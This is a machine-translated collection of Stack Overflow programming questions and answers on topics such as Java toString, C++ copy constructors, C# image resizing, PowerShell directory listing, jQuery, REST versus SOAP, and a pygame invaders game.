例如我有这样的事情：

```
public class a{
     protected int _b;
     protected String _c;
     protected float _d;
     protected int _e;
public a(int b, String c, float d, int e){
            // assign value _b,_c,_d,_e
}

     static class ab implement Iterable<a>{
           public static List myList = new ArrayList(a);
           public static void addlist(a f){
                   myList.add(f);
           public Iterator<a> iterator(){
                   return myList.iterator()}// overriding List iterator method 
```

然后在主要方法中，我通过创建类 a 的实例为 _b,_c,_d,_e 赋值并将其添加到 myList 但是当我使用迭代器时它不显示列表但它显示了该列表的内存位置（我猜） . 我希望它一个一个地显示 a 类中的所有字段。有什么建议我应该怎么做？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:01:04.807

`it doesnt show the list but it shows the memory location( i guess)of that list.`.

它显示了内存位置，因为您没有覆盖该`toString`方法，因此它回退到默认`Object`实现。您需要覆盖类中的`toString`方法`a`。

如果您添加以下内容：

```
public String toString()
{
    return // Some string data. 
} 
```

对于您的`a`班级，您将开始看到正确的输出。

**注意**：Java 命名约定规定所有类都应以大写字母开头，并且每个单词都有一个大写字母。即：`a -> A`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:04:42.257

覆盖`toString()`Class 中的方法`a`。

```
 @Override
 public String toString() {
    return "_b:"+_b+",_c:"+_c+"_d:"+_d+",_e:"+_e;
 } 
```

如果`toString()`没有被覆盖，那么您的 Class`a`使用从 Class 继承的`Object`：

```
public String toString() {
    return getClass().getName() + "@" + Integer.toHexString(hashCode());
} 
```

# c++ - 我的统计类打印垃圾

> ID：15998300
> 
> 赞同：1
> 
> 时间：2013-04-14T10:58:53.710
> 
> 标签：c++, pointers

考虑以下类：

```
class Stats
{
    private:
    int arraySize; // size of array

    int * data; // pointer to data, an array of integers

    // default size of array in default constructor
    static const int DEFAULT_SIZE = 10;

    public:
    Stats() // default constructor
    {
        arraySize = DEFAULT_SIZE; // element count set to 10

        data = new int[DEFAULT_SIZE]; // array of integers
        srand((unsigned int) time(NULL)); // seeds rand() function

        // initializes integer array data with random values
        for (int i = 0; i < DEFAULT_SIZE; i++)
        {
            // data filled with value between 0 and 10
            data[i] = rand() % (DEFAULT_SIZE + 1);
        }
    }

    ~Stats() // destructor that deletes data memory allocation
    {
        delete [] data;
    }

    void displaySampleSet(int numbersPerLine)
    {
        cout << "Array contents:" << endl; // user legibility

        // iterates through array and prints values in array data
        for (int i = 0; i < arraySize; i++)
        {
            cout << data[i];

            /*  nested if statements that either prints a comma between
            values or skips to next line depending on value of numbersPerLine   */
            if (i + 1 < arraySize)
            {
                if ((i + 1) % numbersPerLine != 0)
                    cout << ", ";
                else
                    cout << endl;
            }
        }
    }
} 
```

出于某种原因，当我通过以下方式创建 Stats 对象时：

```
Stats statObject = Stats(); 
```

然后调用 displaySampleSet() ，数字显示正常。但是，当按以下方式创建 Stats 对象时，该函数会打印垃圾：

```
Stats statObject;
statObject = Stats(); 
```

我不知道它为什么这样做，并且感觉它与整数指针“数据”和/或创建对象的方式有关，但我不确定是什么......任何和所有的帮助都是完全的赞赏！非常感谢你。

更新：添加了析构函数

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:06:01.310

两个代码语句都会产生未定义的行为。幸运的是，第一个有效，而第二个无效。

```
Stats statObject = Stats(); 
```

是拷贝初始化。它通过调用默认构造函数复制创建的`Stats`对象，然后`statObject`通过调用复制构造函数将其复制到其中。请注意，您的类不提供复制构造函数，因此使用隐式生成的构造函数。这会创建动态分配成员的浅表副本。创建此副本的对象最终会被销毁，然后您的类中剩下的就是不指向任何有效内容的悬空指针。复制构造函数需要做一个深拷贝。

情况也是如此：

```
Stats statObject;
statObject = Stats(); 
```

其中调用编译器生成的复制赋值运算符。导致与案例1类似的问题。

您需要遵循**[三法则](https://stackoverflow.com/questions/4172722/what-is-the-rule-of-three)**并为该类提供复制构造函数和复制赋值运算符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:14:43.067

您的代码正在使用合成的复制构造函数，编译器定义的赋值运算符。此外，您没有释放为默认构造函数动态分配的内存。您必须定义自己的复制构造，重载赋值运算符（遵循三规则）。

这两种情况都是未定义的行为

```
Stats statObject;
statObject = Stats();  //using compiler defined assignment operator.

Stats statObject = Stats();  //using compiler defined copy constructor. 
```

这里生成的临时对象是使用编译器重载的赋值运算符，并且正在执行浅拷贝而不是深拷贝。重载赋值运算符：

```
Stats& operator=(const Stats& rhs); 
```

定义复制构造函数：

```
Stats(const Stats& rhs); 
```

# c# - 在 C# 中调整图像大小

> ID：15998306
> 
> 赞同：2
> 
> 时间：2013-04-14T10:59:58.507
> 
> 标签：c#, resize, gdi

我有以下在网上找到的方法，它将图像调整为近似大小，同时保持纵横比。

```
 public Image ResizeImage(Size size)
    {
        int sourceWidth = _Image.Width;
        int sourceHeight = _Image.Height;

        float nPercent = 0;
        float nPercentW = 0;
        float nPercentH = 0;

        nPercentW = ((float)size.Width / (float)sourceWidth);
        nPercentH = ((float)size.Height / (float)sourceHeight);

        if (nPercentH > nPercentW)
            nPercent = nPercentH;
        else
            nPercent = nPercentW;

        int destWidth = (int)(sourceWidth * nPercent);
        int destHeight = (int)(sourceHeight * nPercent);

        Bitmap b = new Bitmap(destWidth, destHeight);
        Graphics g = Graphics.FromImage((Image)b);
        g.InterpolationMode = InterpolationMode.HighQualityBicubic;

        g.DrawImage(_Image, 0, 0, destWidth, destHeight);
        g.Dispose();

        return (Image)b;
    } 
```

我通常传入一个宽度为 100 像素、高度为 100 像素的尺寸 - 作为我的要求的一部分，我不能让任何单个维度（高度或宽度）低于 100 像素，所以如果纵横比不是正方形的另一个维度会更高。

我用这种方法发现有时其中一个尺寸会低于 100 像素 - 例如 96 像素或 99 像素。如何更改此方法以确保不会发生这种情况？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T11:45:42.457

该代码是不合适的。它不会因使用浮点数学而得分，它具有以错误方式舍入的诀窍，因此您可以轻松地以 99 像素而不是 100 像素结束。始终支持整数数学，以便您可以控制舍入。它只是没有做任何事情来确保其中一个尺寸足够大，最终得到 96 像素。只需编写更好的代码。像：

```
 public static Image ResizeImage(Image img, int minsize) {
        var size = img.Size;
        if (size.Width >= size.Height) {
            // Could be: if (size.Height < minsize) size.Height = minsize;
            size.Height = minsize;
            size.Width = (size.Height * img.Width + img.Height - 1) / img.Height;
        }
        else {
            size.Width = minsize;
            size.Height = (size.Width * img.Height + img.Width - 1) / img.Width;
        }
        return new Bitmap(img, size);
    } 
```

如果您只想确保图像足够大并接受更大的图像，我留下了一条评论来展示您所做的事情。从问题中并不清楚。如果是这种情况，那么也在 else 子句中复制该 if 语句。

# c# - 调用 PeerFinder.Start() 时“请求的分配大小太大”；

> ID：15998307
> 
> 赞同：0
> 
> 时间：2013-04-14T11:00:01.173
> 
> 标签：c#, windows-8, bluetooth, windows-store-apps

在我的 Windows Store App 项目中执行以下行时

```
PeerFinder.AlternateIdentities["Bluetooth:Paired"] = "";
PeerFinder.Start(); 
```

我收到以下错误：

> > 请求的分配大小太大（HRESULT 异常：0x80080011 (MEM_E_INVALID_SIZE)）

问题出在哪里？我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-10T10:47:20.677

It appears that it is not possible to connect a Windows Store app to a Bluetooth device the same way it can be done in Windows Phone 8.

While `PeerFinder` uses Bluetooth in Windows Phone 8, Wi-Fi Direct is used in Winsdows Store apps for peer discovery. That said, it seems the scenario of connecting a Windows Store app to a Bluetooth device is not currently possible.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-24T09:29:46.537

# powershell - Powershell最快的目录列表

> ID：15998312
> 
> 赞同：4
> 
> 时间：2013-04-14T11:00:22.647
> 
> 标签：powershell, powershell-2.0

任何人都知道进行递归目录列表的快速方法？我正在尝试通过大约 10tb 的 SAN，而“get-childitem -include”需要几天才能运行......我知道没有办法将其缩短到几分钟，但也许有办法将时间缩短到几个小时会很棒。我只需要一个我可以排序的列表不需要文件属性，因为我将使用它在我们的 SAN 上查找某些类型的文件，例如 PST 文件。

如果有人能指出我如何使用[这里](http://www.leporelo.eu/blog.aspx?id=powershell-performance-comparison-compiled-code-cmdlet-or-net-call)的编译代码的方向，我也应该很好。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2015-04-04T13:17:25.677

我知道这已经晚了一天，而且还少了一美元，但是您可以为此目的使用 robocopy，它会列出超过 255 个字符的路径：

`robocopy <SourceRoot> <DummyDestinationDir> /MIR /FP /NC /NS /NDL /NJH /NJS /LOG:<LogFilePath> /L`

我知道它很冗长，但与 PowerShell 相比，robocopy 非常快，尽管我不知道它如何与 cmd 的目录叠加。您可以使用“>”重定向标准输出，也可以将 /LOG: 参数放在上面的位置。我会测试看看哪个更快。请注意，根据我的经验，不要使用 /TEE 选项控制台输出会减慢 robocopy 的速度。另请注意，文件路径将在输出中缩进，但这很容易使用文本编辑器进行纠正，而不是修剪前导和/或尾随空格。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-14T13:16:05.320

作为 Shay sys，Powwershell V3 比 v2 好得多。

如果您只想要文件全名的列表，带有 /B （裸）开关的 legecy dir 命令仍然比 get-childitem 快

```
cmd /c dir <root path> /B /S /A-D 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-14T11:34:04.783

如果它只是您使用 Filter 参数的一个扩展，它比 -Include 快得多。我还建议尽可能使用 PowerShell 3（get-childitem 具有新的 -file 开关），据我记得列出 UNC 路径的性能在其中得到了增强（具有底层 .net 4 支持）。

另一种选择是从 cmd 窗口使用 dir 命令，应该非常快。

# javascript - 如何将 p 放入标签中

> ID：15998314
> 
> 赞同：3
> 
> 时间：2013-04-14T11:00:37.807
> 
> 标签：javascript, jquery, text, jquery-selectors, anchor

我有这个 HTML：

```
<a href=#>First</a>
<a href=#>Second</a>
<a href=#>Third</a> 
```

我怎么能有：

```
<a href=#><p class="test">First</p></a>
<a href=#><p class="test">Second</p></a>
<a href=#><p class="test">Third</p></a> 
```

我试过这个，但它不起作用：

```
$(function(){
    $("a").text().prepend("<p class="test">"+ $("a").text() +"</p>");
}); 
```

我是新手，谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-14T11:02:27.813

您正在寻找[wrapInner()](http://api.jquery.com/wrapInner/)函数：

```
$("a").wrapInner("<p class='test'></p>") 
```

[工作演示](http://jsfiddle.net/SYNGc/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:16:36.913

试试这个。

```
$("a").text("<p>"+$("a").text()+"</p>"); 
```

# rest - 从 WSDL 生成 REST

> ID：15998315
> 
> 赞同：4
> 
> 时间：2013-04-14T11:00:50.737
> 
> 标签：rest, wsdl

我正在寻找自动生成 REST ws 的最佳方法。我们收集了带有为它们生成的 WSDL 的 Web 服务 (SOAP)。我需要提供不同的 API 来调用这些 Web 服务。（PHP、Pyton、REST、CLI ...）其中一项要求是为这些 ws 提供 REST API。

生成 REST 客户端/服务器的最佳方法是什么，是否有任何自动工具？WSDL 有可能会更改每个版本。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T21:33:49.283

**无法从 WSDL 生成 REST API。**你不能混合橙子和苹果

SOAP 是建立在 HTTP 之上的协议。WebService 由一组方法/操作表示。您可以将 WebService 视为复杂的 RPC。一般来说，我们可以说**WebServices 是关于动词**的，用来调用远程方法/动作。WebService 也没有统一的接口，这就是 WSDL 存在的原因。

REST 是架构风格（范围比 API 更广泛）。REST API 由一组资源和表示表示。资源是信息的来源，通过统一的接口进行管理。通常我们可以说**REST API 是关于名词**的。因为所有资源都必须具有统一的接口，所以不需要 WADL（为 REST 创建类似 WSDL 的失败尝试）。

我怀疑您可以自动将动词转换为名词等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-03-31T19:41:37.150

无需重写现有的基于 SOAP 的 Web 服务，而是使用 API Express 将其呈现为移动就绪的 REST 服务。无需转换。继续运行 SOAP 服务，通过 WSDL 文件和一些配置参数，它可以轻松地作为 REST 服务集成到移动应用程序中。

如何将 WSDL 服务 (SOAP) 公开为 REST API：[https ://dzone.com/articles/how-to-expose-a-wsdl-service-soap-as-rest-api](https://dzone.com/articles/how-to-expose-a-wsdl-service-soap-as-rest-api)

Appery.io API Express：[https ://appery.io/api-express/](https://appery.io/api-express/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-02-21T06:25:09.087

请查看以下描述如何使用 WSDL2.0 描述 REST 服务的文章。只有在预期的消息格式是 XML 时才能使用它。 [https://www.ibm.com/developerworks/library/ws-restwsdl/](https://www.ibm.com/developerworks/library/ws-restwsdl/)

# javascript - 如何克隆元素并更改其 DOM 类型

> ID：15998323
> 
> 赞同：3
> 
> 时间：2013-04-14T11:01:50.463
> 
> 标签：javascript, jquery, html, dom

我想克隆一个 DOM 元素及其所有子元素（包括数据和侦听器），但我希望生成的克隆具有不同的 DOM 类型。

例如我想转换：

```
<td>
 <p class="pclass">
  Hello
 </p>
 <p class="pclass">
  World!
 </p>
</td> 
```

到包含以下内容的新元素：

```
<div>
 <p class="pclass">
  Hello
 </p>
 <p class="pclass">
  World!
 </p>
</div> 
```

注意：我已经有了答案，但因为它可能会引起其他人的兴趣，并且答案并不完美但足够，所以我创建了这个主题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:01:50.463

下面的 jQuery 脚本将完成这项工作：

```
var oldElement = $(your selector here);
var newElement = $('<my new HTML tag>').append($(oldElement).contents().clone(true, true)); 
```

此脚本保留元素**子**数据和事件侦听器（参见 clone(true, true)）。此脚本不保留元素**本身**的数据和事件侦听器。

注意：有人提出一个补充来保留原始元素数据和事件侦听器可能很有趣。那里提出了一个答案的开始：[https ://stackoverflow.com/a/2207117/2227298](https://stackoverflow.com/a/2207117/2227298)

# c - 如何停止阅读“cat /dev/urandom”？

> ID：15998325
> 
> 赞同：2
> 
> 时间：2013-04-14T11:01:52.673
> 
> 标签：c, cat

我正在编写一个读取标准输入的程序。我有一个这样的循环：

```
while(read(0, buffer, sizeof(buffer)) > 0) 
```

它工作正常，但是当我做一个 cat /dev/urandom | ./myprogram 循环永远不会停止。所以我想在一段时间后停止阅读。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:05:54.720

改为这样做，将 2K 的随机数据放入`myprogram`：

```
 cat /dev/urandom | head -c 2000 | ./myprogram 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:15:35.253

您可能想使用`alarm()`.

```
alarm(1);

{
  size_t ssizeReadTotal = 0;

  {
    ssize_t ssizeRead = 0;

    while (0 < (ssizeRead = read(0, buffer + sizeReadTotal, sizeof(buffer) - sizeReadTotal)))
    {
      sizeReadTotal += ssizeRead;
    }

    if (0 > ssizeRead) 
    {
      if (EINTR == errno))
      {
        fprintf(stderr, "Filling the buffer was interrupted by alarm clock.\n");

      }
      else /* some *real* error occurred */
      {
        perror("read()");
      }
    }
  }

  if (sizeof(buffer) > sizeReadTotal)
  {
    fprintf(stderr, "The buffer was not fully initialised!\n");
  }
} 
```

这会`SIGALRM`在一秒钟后发出信号。该信号中断对 的调用`read()`。它将返回`-1`并设置`errno`为`EINTR`。

`read()`当缓冲区被填满时，ing 也会停止。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T12:57:32.757

不久前我遇到了这样的问题。您可以使用`time`and `difftime`，例如这样：

```
time_t t = time(NULL);
double max_seconds = 1.0;
while (read(0, buffer, sizeof(buffer)) > 0 && difftime(time(NULL), t) < max_seconds) {
    /* ... */
} 
```

# python - Dpkt lib - 如何为数据包添加时间戳

> ID：15998327
> 
> 赞同：1
> 
> 时间：2013-04-14T11:02:05.403
> 
> 标签：python, python-2.7, timestamp

所以我正在尝试创建自己的 pcap 文件，我已经使用 dpkt 创建了一个 msg，但我不明白如何操纵时间戳，从我所见它是 writepkt 中的第三个参数，但我不明白如何初始化变量..这是我的代码的一部分

```
output_pcapfile = dpkt.pcap.Writer(open(__file__+'.pcap','wb'))
tcpSrc.data = 'Some data\r\n'
ipSrc.data  = tcpSrc

ipSrc.len   = len(str(ipSrc))
ethSrc.data = ipSrc

packet_count = 1
output_pcapfile.writepkt(ethSrc,packet_count) # somehow get timestamp for third parameter!! 
```

有人有想法吗？谢谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T19:05:46.350

查看 1.7 的源代码`pcap.py`，

我懂了：

```
 def writepkt(self, pkt, ts=None):
    if ts is None:
        ts = time.time()
    #some more code.. 
```

此函数接受两个非自变量

如果您仅传入其本身，则会创建时间戳`pkt`，例如

output_pcapfile.writepkt(ethSrc)

# html - 映射元素的背景图像

> ID：15998331
> 
> 赞同：2
> 
> 时间：2013-04-14T11:02:47.330
> 
> 标签：html, css, imagemap

我知道我们有`<map>`并且`<area>`用于映射图像。我想使用这个的多边形模式。

但试想一下，我有一个`div`带有背景图像的元素，我想将背景图像映射为`<img>`.

我的形状不是矩形或正方形；它是一个多边形。而且我不想使用透明 div 技巧。

我怎样才能映射这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T12:36:44.547

使用带有图像映射的透明图像（例如 with `opacity:0`），位于您的 div 上方。这个效果就是[ImageMapster](http://www.outsharked.com/imagemapster)插件的工作原理。

我写了[一篇博文](http://blog.outsharked.com/2012/02/dragging-and-dropping-onto-html-image.html)，解释了这些效果是如何工作的。总而言之，您可以在任何您想要的东西之上使用 HTML 图像映射。您需要做的就是确保`img`具有最高的`z-index`，并且是透明的，并且绝对位于您希望最终用户实际看到的元素的顶部。如果它是透明的，最终用户将只能看到它背后的内容，让您可以完全灵活地使用图像映射的多边形位置跟踪功能到任何其他类型的元素，例如`div`.

例子：

```
<div id="container">
    <img style="position: absolute; top: 0; left: 0; opacity: 0; 
                width: 100px; height: 100px;" 
         src="/placeholder.jpg" 
         usemap="#my-image-map">
    <div style="position: absolute; top: 0; left:0; 
                background-image: url(/some-100-by-100-pixel-image.jpg)">
</div> 
```

# c++ - C++中100位数字的平方根

> ID：15998332
> 
> 赞同：4
> 
> 时间：2013-04-14T11:02:48.153
> 
> 标签：c++, square-root

*'unsigned long long'*最多可以解出 15 位数字。

***有没有办法找到100位数字***的平方根？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:44:52.820

您还可以使用*Boost.Multiprecision*库。这个库为一些流行的多精度实现提供了包装器。

```
#include <iostream>
#include <string>
#include <utility>

#include <boost/multiprecision/mpfr.hpp>

int main()
{
    std::string s(100, '0');
    s.at(0) = '1';
    boost::multiprecision::mpfr_float_100 f(std::move(s));
    boost::multiprecision::mpfr_float_100 sqrt = boost::multiprecision::sqrt(f);
    std::cout << sqrt.str() << std::endl;

    return 0;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-14T11:04:57.403

确实。一种简单的方法是使用 GNU 多精度库的[mpz_sqrt()](http://gmplib.org/manual/Integer-Roots.html#Integer-Roots)函数。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-14T11:05:18.870

这个问题与 C++ 并没有真正的关系，但这里有一个您可以使用的方法列表[http://en.wikipedia.org/wiki/Methods_of_computing_square_roots](http://en.wikipedia.org/wiki/Methods_of_computing_square_roots)

取决于它的功课与否，您也许可以使用预制库来处理 bignums

# java - Java中是否继承了同步？

> ID：15998335
> 
> 赞同：32
> 
> 时间：2013-04-14T11:03:05.470
> 
> 标签：java, inheritance, synchronized

我有超类`Point`和`synchronized`方法`draw()`。如果我覆盖其中的方法或者我必须始终编写它，它们的子类会`Point`继承吗？`synchronized``draw()`

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-04-14T11:14:17.170

不，你总是要写`synchronized`。如果你调用超类的同步方法，这当然是一个同步调用。`synchronized`不是方法签名的一部分。

请参阅[http://gee.cs.oswego.edu/dl/cpj/mechanics.html](http://gee.cs.oswego.edu/dl/cpj/mechanics.html)以了解来自 Java 线程老板（左右）的 Doug Lea 的详细描述。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-14T11:20:28.857

您可以通过编写以下代码自行检查：

```
public class Shape {

    protected int sum = 0;

    public synchronized void add(int x) {
        sum += x;
    }
}

public class Point extends Shape{

    public void add(int x) {
        sum += x;
    }

    public int getSum() {
        return sum;
    }
} 
```

和测试班

```
public class TestShapes {

    public final static int ITERATIONS = 100000;

    public static void main(String[] args) throws InterruptedException {

        final Point p = new Point();

        Thread t1 = new Thread(){
            @Override
            public void run() {

                for(int i=0; i< ITERATIONS; i++){
                    p.add(1);
                }
            }
        };

        Thread t2 = new Thread(){
            @Override
            public void run() {

                for(int i=0; i< ITERATIONS; i++){
                    p.add(1);
                }
            }
        };

        t1.start();
        t2.start();

        t1.join();
        t2.join();

        System.out.println(p.getSum()); // should equal 200000

    }
} 
```

在我的机器上是 137099 而不是 200000。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-14T11:13:00.597

如果您**覆盖**它并删除`synchronized`. [在这里](https://stackoverflow.com/a/15493221/1515052)和[这里](https://bugs.eclipse.org/bugs/show_bug.cgi?id=239066)找到它

# php - 使用 GD 或 Imagick 扩展图像画布

> ID：15998348
> 
> 赞同：3
> 
> 时间：2013-04-14T11:04:25.790
> 
> 标签：php, gd, image-manipulation, imagick

假设我有一个 200x100 的图像，我将其调整为 100x50：

```
// imagick
$imagick->resizeImage($width, $height, Imagick::FILTER_UNDEFINED, 1)

// gd
$image = imagecreatetruecolor($width, $height);
imagecopyresampled($image, $src, 0, 0, 0, 0, $width, $height, imagesx($src), imagesy($src))) 
```

但我希望图像为 120x120。如何将画布扩展到该大小，但将我刚刚调整大小的图像保持在中心的相同尺寸？Photoshop中的图像->画布大小之类的东西

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T11:53:36.443

```
// make the canvas, fill it with $color
$canvas = imagecreatetruecolor(120, 120);
imagefilledrectangle($canvas,0,0,120,120,$color);

// get the image from file...
list($width, $height) = getimagesize('myimage.jpg');
$img = getimagefromjpg('myimage.jpg');

// resample image and place it in center of canvas
$x = intval(($width - 100) / 2);
$y = intval(($height - 50) / 2); 
imagecopyresampled($canvas, $img, $x, $y, 0, 0, 100, 50, $width, $height);

// output etc. ... 
```

# python - 我的精灵检查器不起作用

> ID：15998353
> 
> 赞同：1
> 
> 时间：2013-04-14T11:04:42.463
> 
> 标签：python, python-2.7, pygame, sprite

我创建了代码来查看我的外星人是否死了，但是它不起作用，任何人都可以看到问题。

代码：

```
 enemies = pygame.sprite.Group(aliens)
            if len(enemies) <= 0:
                print("game over")
                gameover() 
```

完整代码：

```
#MathsVaders

import pygame, random, time
from pygame.locals import *
import Databaseconnector
import tkMessageBox

pygame.init()

# set up the graphics window
size = [800, 595]
screen = pygame.display.set_mode(size, 0)
screenrect = screen.get_rect()
pygame.display.set_caption("Mathsvaders")

# set some variables
done = False
life = 3

aliens = pygame.sprite.Group()
allsprites = pygame.sprite.Group()
bombs = pygame.sprite.Group()
green = [0, 255, 0]
white = [255, 255, 255]

# create a timer to control how often the screen updates
clock = pygame.time.Clock()
fps = 100

# loads images to use in the game which link in with my classes(further down)
cannon = pygame.image.load("spaceship.png").convert()
cannon.set_colorkey(white)
blast = pygame.image.load("blast.png").convert_alpha()
boom = pygame.image.load("expl.png").convert_alpha()
bomb = pygame.image.load("missile_player.png").convert_alpha()
back = pygame.image.load("rsz_space.png").convert()
enemy = pygame.image.load("sii.png").convert_alpha()
lives2 = pygame.image.load("alien2.png").convert()
lives2.set_colorkey(white)
lives3 = pygame.image.load("alien3.png").convert()
lives3.set_colorkey(white)
lives1 = pygame.image.load("alien1.png").convert()
lives1.set_colorkey(white)

# (Classes)
# the explosion class
class Explosion(pygame.sprite.Sprite):
        def __init__(self, x, y):
                pygame.sprite.Sprite.__init__(self)
                self.image = boom
                self.rect = self.image.get_rect()
                self.rect.centerx = x
                self.rect.centery = y
                self.count = 6

        def update(self):
                self.count -= 1
                if self.count < 1:
                        self.kill()

class scoreClass:
        def __init__(self):
                self.value = 0
                # set a font, default font size 28
                self.font = pygame.font.Font(None, 28)

        def update(self):
                text = self.font.render("Score: %s" % self.value, True, (green))
                textRect = text.get_rect()
                textRect.centerx = screenrect.centerx
                screen.blit(text, textRect)

class Msg:
        def __init__(self, words):
                # set a font, default font size 28
                self.font = pygame.font.Font(None, 28)
                self.text = self.font.render(words, True, (green))
                self.textRect = self.text.get_rect()

        def update(self):
                self.textRect.centerx = screenrect.centerx
                self.textRect.centery = screenrect.centery
                screen.blit(self.text, self.textRect)

# the invader class
class Pi(pygame.sprite.Sprite):
        def __init__(self, x, y):
                pygame.sprite.Sprite.__init__(self)
                aliens.add(self)
                self.image = enemy
                self.rect = self.image.get_rect()
                self.rect.left = x
                self.rect.top = y
                self.speed = 1

        def update(self):
                self.rect.right += self.speed
                if self.rect.right >= (screenrect.right -5):
                        self.speed = -1
                        self.rect.top += self.rect.height
                if self.rect.left <= (screenrect.left +5):
                        self.speed = 1
                        self.rect.top += self.rect.height
                if self.rect.top > screenrect.bottom:
                        self.kill()
                i = random.randrange(1000)
                j = self.rect.centerx
                if i == 1:
                        laser_bomb = Bomb(j, self.rect.bottom)
                        allsprites.add(laser_bomb)
                        aliens.add(laser_bomb)

class Gun(pygame.sprite.Sprite):
        def __init__(self):
                pygame.sprite.Sprite.__init__(self)
                self.image = cannon
                self.rect = self.image.get_rect()
                self.rect.bottom = screenrect.bottom
                self.rect.centerx = screenrect.centerx
                self.speed=0

        def update(self):
                self.rect.centerx += self.speed
                if self.rect.right >= screenrect.right:
                        self.rect.centerx = 0
                if self.rect.right <= 0:
                        self.rect.right = screenrect.right

# bomb class
class Bomb(pygame.sprite.Sprite):
        def __init__(self, x, y):
                pygame.sprite.Sprite.__init__(self)
                self.image = bomb
                self.rect = self.image.get_rect()
                self.rect.centerx = x
                self.rect.centery = y
                bombs.add(self)

        def update(self):
                self.rect.centery +=1

# the laser blast class
class Blast(pygame.sprite.Sprite):
        def __init__(self):
                pygame.sprite.Sprite.__init__(self)
                self.image = blast
                self.image.set_colorkey(white)
                self.rect = self.image.get_rect()
                self.rect.top = (player.rect.top + 5)
                self.rect.centerx = player.rect.centerx
                self.speed = 0

        def update(self):
                if self.speed == 0:
                        self.rect.centerx = player.rect.centerx
                self.rect.top -= self.speed

# function to make a sheet of invaders
def invade():
        for j in range(10, 200, 120):
                for i in range(10):
                        aliens.add(Pi((i*70)+10, j))

def gameover():
        message = Msg("Game Over")
        message.update()
        player.kill()
        shot.kill()
        SQL = 'INSERT INTO TblScore(Score, StudentID) VALUES (' + str(score.value) + ', ' + str(8) + ')'
        Databaseconnector.INSERT(SQL)

        #pygame.quit()

##def gameover():
##      message = Msg("Game Over")
##      message.update()
##      player.kill()
##      shot.kill()
##        SQL = 'INSERT INTO TblScore(Score, StudentID) VALUES (' + str(score.value) + ', ' + str(8) + ')'
##        Databaseconnector.INSERT(SQL)
##
##        #pygame.quit()

def gamewon():
   # sprites(aliens) == 0
    #sprites.aliens == 0
    message = Msg("YOU WON, YOUR SCORE WAS " + score +  " WELL DONE")
    message.update
    aliens.kill()
    shot.kill()
    pygame.quit()

# pre-game window
invade()

message = Msg("Press a key to play.")
allsprites.add(aliens)
key = True

while key:
        screen.blit(back, (0,0))
        for event in pygame.event.get():
                if event.type == pygame.QUIT:
                        pygame.quit()
                if event.type == pygame.KEYDOWN:
                        for item in (aliens):
                                item.kill()
                        key = False

        allsprites.update()
        allsprites.draw(screen)
        message.update()

                # set the loop to 40 cycles per second
        clock.tick(fps)

                #  update the display
        pygame.display.flip()

# Main Game Starts Here

score = scoreClass()
player = Gun()
shot = Blast()
invade()
allsprites.add(player, aliens, shot)

while done==False:
        screen.blit(back, (0,0))

        for event in pygame.event.get():
                if event.type == pygame.QUIT:
                        done=True

        if life <= 0:
                gamewon()

##        elif allsprites == 0:
##            gamewon()

        else:
                # shoots laser missile
                if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_UP:
                                if shot.speed == 0:
                                        shot.speed = 7
                                        #laser.play()

                        if event.key == pygame.K_LEFT:
                                player.speed = -3
                        if event.key == pygame.K_RIGHT:
                                player.speed = 3

                if event.type == pygame.KEYUP:
                        if event.key == pygame.K_LEFT:
                                player.speed = 0
                        if event.key == pygame.K_RIGHT:
                                player.speed = 0

                hit = pygame.sprite.spritecollide(shot, aliens, 1)
                if len(hit) > 0:
                        explosion1 = Explosion(shot.rect.centerx, shot.rect.top)
                        score.value += 1500
                        shot.kill()
                        #explode.play()
                        shot = Blast()
                        allsprites.add(shot, explosion1)

                hit2 = pygame.sprite.spritecollide(player, aliens, 1)
                if len(hit2) > 0:
                        life -= 1
                        #explode.play()
                        explosion2 = Explosion(player.rect.centerx, player.rect.centery)
                        allsprites.add(explosion2)
                        player.kill()
                        shot.kill()
                        if life > 0:
                                ready = Msg("Push Harder !!.")
                                ready.update()
                                allsprites.update()
                                allsprites.draw(screen)
                                score.update()
                                pygame.display.flip()
                                for item in bombs:
                                        item.kill()
                                while 1:
                                        event = pygame.event.wait()
                                        if event.type == pygame.KEYDOWN:
                                                break
                                player = Gun()
                                shot = Blast()
                                allsprites.add(player, shot)

                if shot.rect.top <= screenrect.top:
                        shot.kill()
                        shot = Blast()
                        allsprites.add(shot)

        if life == 2:
                men = lives2
        if life == 1:
                men = lives1
        if life == 3:
                men = lives3

        if life > 0:
                screen.blit(men, (0,0))

        allsprites.update()
        allsprites.draw(screen)
        score.update()

        # set the loop to "fps" cycles per second
        clock.tick(fps)
        #  update the display
        pygame.display.flip()

# close pygame
pygame.quit() 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-14T11:37:33.717

这是“pythonic”方式，因为空列表为 False：

```
if not enemies:
